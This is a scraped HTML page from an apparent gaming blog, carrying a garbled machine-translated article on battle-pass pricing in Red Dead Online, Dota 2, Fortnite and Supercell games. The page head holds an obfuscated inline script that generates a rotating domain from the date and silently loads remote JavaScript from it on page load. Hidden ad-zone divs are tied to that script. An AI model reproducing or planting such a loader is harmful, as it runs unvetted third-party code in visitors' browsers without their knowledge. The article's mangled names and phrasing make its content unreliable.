<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="On September 10, 2019, the wild escort ol finally ushered in a new round of major version updates, adding three different professions for players to choose, so that players can finally have extra thin">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="Want you money, want you liver, gradually become the trend of the small pass charging mode">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="On September 10, 2019, the wild escort ol finally ushered in a new round of major version updates, adding three different professions for players to choose, so that players can finally have extra thin">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/c57c616ea2eb42ec912d18fb3989bd51.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/ce16533005684cb4a54d89a6784bc5b9.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/8ec6d46dffd84958ab1831dd7f497082.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/133c3bc57b3e4bcc994ebab1d1bf19fb.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/683840d9db474d9ab11780771770669e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/46151821ab9340baa63de9cb0376b4e5.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/5596c0611e5b43dc9c24d8bcf74fe9de.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:50.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Want you money, want you liver, gradually become the trend of the small pass charging mode">
<meta name="twitter:description" content="On September 10, 2019, the wild escort ol finally ushered in a new round of major version updates, adding three different professions for players to choose, so that players can finally have extra thin">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/c57c616ea2eb42ec912d18fb3989bd51.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Want you money, want you liver, gradually become the trend of the small pass charging mode | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Want you money, want you liver, gradually become the trend of the small pass charging mode</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>On September 10, 2019, the wild escort ol finally ushered in a new round of major version updates, adding three different professions for players to choose, so that players can finally have extra things to do besides the confrontation mode, and these professions are relatively interesting. At the same time, a game service called “Wheeler Lawson club” has been updated in the game, which allows players to get experience value by participating in various activities. After accumulating a certain amount of experience, they can get various rewards free of charge.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/c57c616ea2eb42ec912d18fb3989bd51.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>In addition to this free update service, players can also purchase an upgrade service named “the outside pass” by paying for an extra currency named “gold bar” in the game, which allows players to get an additional experience reward route, and can also accumulate experience to get additional reward content. This seemingly novel operation mode is not the first one created by the developer Rockstar, but it’s amazing that R-star has also begun to operate in this mode called “battle pass”.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/ce16533005684cb4a54d89a6784bc5b9.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"></p>
<p>#The third payment revolution<br>“Battle pass” is called “battle pass” in Chinese. This name may not be unfamiliar to the players in the regular mixed e-game circle. This charging mode first appeared in MoBa game “dota2”. When the annual International Invitational Tournament (TI) begins, this kind of “battle pass” or “warrior warrant” or “interactive” will be launched in the play The upgrade service of “guide” is also known as “Ti notebook”.<br>The purpose of launching this service is to raise competition bonus for Ti competition. Every consumption of players in Ti book can raise 25% bonus for competition. At first, players can predict the trend of competition through this book. The more people they buy, the richer the reward, which means “crowdfunding”. Later, there is a rule of thumb in the book. Each level has different rewards. Players can not only spend more money to buy a higher level book, but also gain experience by doing tasks to upgrade the book. In short, if they buy a book, they will have to spend money as well as explode the liver. Usually most dota players will recharge the notebook for the reward attached to the high level of the notebook. For them, the content of these periods is directly proportional to the money they pay. I have to say that G Pang will still make money.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/8ec6d46dffd84958ab1831dd7f497082.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>When it comes to the game that really promotes this charging mode, it is a group of black horses that no one thought of: Escape Game “Fortress night” produced by epic. The big escape mode of Fortress night is also a free game, but different from dota2, players can accumulate experience value of two rewards at the same time when playing for free. Free players can only obtain one of them named “silver”, but also accumulate experience for the reward of “gold”. Every player who buys a pass can obtain all previous experience The accumulated “gold” rewards are quite attractive for every player who has invested a lot of time in the game.<br>You know, the pass price in Fortress night is not high, but at that time, fortress night was in the most popular period, the number of players broke new highs repeatedly, and this kind of reward measure is very attractive. As long as some people are willing to pay out, they can make a lot of money for the game, and more people are willing to pay out than anyone imagined Much more, epic also made a lot of money, and the success of Fortress night is also known in the industry as “the third payment Revolution (the other two are the length and buyout system and the props charging system)”, which makes many manufacturers see red.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/133c3bc57b3e4bcc994ebab1d1bf19fb.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>The items you can get after you pay are very rich<br>Very soon, the charging mode was spread like the infectious disease in the game field. Almost all the mainstream games with internal charges were added to this service, especially in the field of hand travel. The representative of Finland game company Supercell, the tribal conflict and the Royal war, joined the two category named “gold / Royal family”. Token’s passport service has enabled the game to create a new revenue record after years of operation, with revenue increasing by 155% in just one week.<br>The design of supercell’s pass is the same as that of Fortress night, but it has made some adjustments according to its own setting of being a mobile game and playing more leisure. It is more like a disguised member service, but the proportion of pass mode is larger. Looking back, many domestic manufacturers, such as “King’s glory” and “peace elite”, have the same charging mode. However, the pass price in these games is relatively high. They do not adjust according to the style of supercell at all, nor have the conscience of “Fortress night”, but directly refer to the mode of paying purchase level in “dota2” Charge.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/683840d9db474d9ab11780771770669e.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>Gold token</p>
<h1 id="the-difference-between-a-thousand-times-for-one-person-and-a-thousand-times-for-one-person"><a href="#the-difference-between-a-thousand-times-for-one-person-and-a-thousand-times-for-one-person" class="headerlink" title="the difference between a thousand times for one person and a thousand times for one person"></a>the difference between a thousand times for one person and a thousand times for one person</h1><p>Why is it just a simple change of charging mode that can make the game so profitable? In fact, the mystery is very simple. Although there are many games charged with props in the domestic market, they have become popular in other countries in recent years. No matter at home or abroad, most of the game works with internal purchase elements are usually not very cheap in the impression of players, and the cheap content has no substantial impact on the experience itself, so they are playing for free There is usually a polarization in the play, either heavy krypton tycoon or zero krypton saltfish. The appearance of pass mode means that the overall charging standard of the game will be reduced, thus making the payment threshold of the game lower. After all, not all players’ spare money is so abundant. Therefore, lowering the threshold will also give many shy players a choice.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/46151821ab9340baa63de9cb0376b4e5.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>Hierarchical membership is something many players don’t want to see<br>On the other hand, a large part of the reason why fortress night is so successful lies in its unique design of pass, which enables players to have a more intuitive understanding of what they can get. At the same time, there is no “pay 2 win” element in these contents, which are basically some ornaments and props that can only modify the appearance. The design of the pass can make all paying players stay on the same level. There is no difference between high and low. All the things that the players who pay for the pass get are the same. It’s just that who is more diligent to complete the task. Under this design, even the players who don’t have any desire to pay usually can’t help but appear, which makes the per capita consumption obvious After all, the increase of the game’s income is not only achieved by a few rich tycoons or player traffic, but also by making every player have the desire to pay for the game itself. In this way, there will be no dispute about krypton gold in the past for the players.<br><img src="http://maiygu.xyz/2019/11/08/Want you money, want you liver, gradually become the trend of the small pass charging mode/5596c0611e5b43dc9c24d8bcf74fe9de.jpg" alt="Want you money, want you liver, gradually become the trend of the small pass charging mode"><br>Glory war order<br>    concluding remarks<br>In contrast, the pass used in the ol of the big escort in the wilderness can be called very conscientious. After all, the gold bars needed to buy the pass can be obtained through multiple channels in the game, and the price of the pass itself is not very expensive. It can be said that this time is a real compromise. After all, since the ol of the big escort has been online, the risk assessment has been bad, and the charging content is not good Over pricing has also been criticized by players. It can be seen that R star still has a lot of hope in this game. I hope that with this wave of “pass” wave, we can get a better future.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/What is life Gamification Is life a game/" rel="next" title="What is life Gamification Is life a game">
                <i class="fa fa-chevron-left"></i> What is life Gamification Is life a game
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Use the whole body senses to enjoy an elegant performance, two and a half games of the poet Shangtian literati/" rel="prev" title="Use the whole body senses to enjoy an elegant performance, two and a half games of the poet Shangtian literati">
                Use the whole body senses to enjoy an elegant performance, two and a half games of the poet Shangtian literati <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#the-difference-between-a-thousand-times-for-one-person-and-a-thousand-times-for-one-person"><span class="nav-number">1.</span> <span class="nav-text">the difference between a thousand times for one person and a thousand times for one person</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
